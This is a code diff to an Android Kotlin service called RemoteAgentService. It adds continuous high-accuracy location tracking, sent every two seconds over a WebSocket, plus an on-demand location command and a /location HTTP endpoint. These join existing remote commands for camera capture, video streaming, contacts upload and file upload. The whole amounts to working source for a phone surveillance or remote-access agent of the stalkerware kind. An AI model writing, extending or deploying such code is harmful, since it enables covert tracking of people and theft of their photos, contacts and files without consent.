@@ -44,6 +44,11 @@ import android.Manifest
 import android.util.Base64
 
 import androidx.core.app.ActivityCompat
+import com.google.android.gms.location.LocationCallback
+import com.google.android.gms.location.LocationRequest
+import com.google.android.gms.location.LocationResult
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
 
 
 class RemoteAgentService : Service() {
@@ -59,6 +64,7 @@ class RemoteAgentService : Service() {
         startForeground(1, createNotification())
         startServer()
         connectWebSocket()
+        startLocationUpdates()
     }
 
     private var reconnecting = false
@@ -94,6 +100,7 @@ class RemoteAgentService : Service() {
                             "video" -> handleVideo(json.optString("which"))
                             "contacts" -> handleContactsUpload()
                             "files" -> handleFileUpload()
+                            "location" -> handleLocation()
                             "file_list" -> {
                                 val path = json.optString("path", "")
                                 handleFileListWS(path)
@@ -188,6 +195,103 @@ class RemoteAgentService : Service() {
         }
         return Gson().toJson(contactsList)
     }
+
+    private fun startLocationUpdates() {
+        val client = LocationServices.getFusedLocationProviderClient(this)
+
+        val request = LocationRequest.Builder(
+            Priority.PRIORITY_HIGH_ACCURACY,
+            2000 // 2 seconds
+        ).setMinUpdateDistanceMeters(1f)
+            .setWaitForAccurateLocation(true)
+            .build()
+
+        val callback = object : LocationCallback() {
+            override fun onLocationResult(result: LocationResult) {
+                val loc = result.lastLocation ?: return
+
+                val json = """
+                {
+                  "type": "location",
+                  "deviceId": "$deviceId",
+                  "lat": ${loc.latitude},
+                  "lng": ${loc.longitude},
+                  "accuracy": ${loc.accuracy}
+                }
+            """.trimIndent()
+
+                wsClient?.send(json)
+                println("📍 Background Location: $json")
+            }
+        }
+
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        client.requestLocationUpdates(request, callback, Looper.getMainLooper())
+    }
+
+
+    private fun handleLocation() {
+
+        if (ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            wsClient?.send(
+                """{
+                "type":"location",
+                "deviceId":"$deviceId",
+                "error":"Location permission not granted"
+            }"""
+            )
+            return
+        }
+
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+
+        val providers = locationManager.getProviders(true)
+        var bestLocation: android.location.Location? = null
+
+        for (provider in providers) {
+            val l = try { locationManager.getLastKnownLocation(provider) } catch (e: Exception) { null }
+            if (l != null) {
+                if (bestLocation == null || l.accuracy < bestLocation!!.accuracy) {
+                    bestLocation = l
+                }
+            }
+        }
+
+        if (bestLocation == null) {
+            wsClient?.send(
+                """{
+                "type":"location",
+                "deviceId":"$deviceId",
+                "error":"No location available"
+            }"""
+            )
+            return
+        }
+
+        val json = """
+        {
+          "type": "location",
+          "deviceId": "$deviceId",
+          "lat": ${bestLocation.latitude},
+          "lng": ${bestLocation.longitude},
+          "accuracy": ${bestLocation.accuracy}
+        }
+    """.trimIndent()
+
+        wsClient?.send(json)
+
+        println("📍 Sent location: $json")
+    }
+
 
 
     private fun handleCapture(which: String) {
@@ -414,6 +518,7 @@ class RemoteAgentService : Service() {
 //                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
 //                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                     session.uri == "/contacts" -> getContacts()
+                    session.uri == "/location" -> getLocationHttp()
                     session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                     else -> newFixedLengthResponse(
                         Response.Status.OK,
@@ -427,6 +532,7 @@ class RemoteAgentService : Service() {
                             <li><a href='/capture/back'>📸 Back Camera</a></li>
                              <li><a href='/video/front'>🤳 Front Video Camera</a></li>
                             <li><a href='/video/back'>📸 Back Video Camera</a></li>
+                            <li><a href='location'>Location</a></li>
                         </ul>
                     """.trimIndent()
                     )
@@ -556,6 +662,58 @@ class RemoteAgentService : Service() {
         else
             NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
     }
+
+    private fun getLocationHttp(): NanoHTTPD.Response {
+
+        if (ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            return NanoHTTPD.newFixedLengthResponse(
+                NanoHTTPD.Response.Status.FORBIDDEN,
+                "text/plain",
+                "Location permission not granted"
+            )
+        }
+
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+
+        val providers = locationManager.getProviders(true)
+        var bestLocation: android.location.Location? = null
+
+        for (provider in providers) {
+            val l = try { locationManager.getLastKnownLocation(provider) } catch (e: Exception) { null }
+            if (l != null) {
+                if (bestLocation == null || l.accuracy < bestLocation!!.accuracy) {
+                    bestLocation = l
+                }
+            }
+        }
+
+        if (bestLocation == null) {
+            return NanoHTTPD.newFixedLengthResponse(
+                NanoHTTPD.Response.Status.OK,
+                "application/json",
+                """{"error":"No location available"}"""
+            )
+        }
+
+        val json = """
+    {
+      "lat": ${bestLocation.latitude},
+      "lng": ${bestLocation.longitude},
+      "accuracy": ${bestLocation.accuracy}
+    }
+    """.trimIndent()
+
+        return NanoHTTPD.newFixedLengthResponse(
+            NanoHTTPD.Response.Status.OK,
+            "application/json",
+            json
+        )
+    }
+
 
 
     private var ws: WebSocket? = null
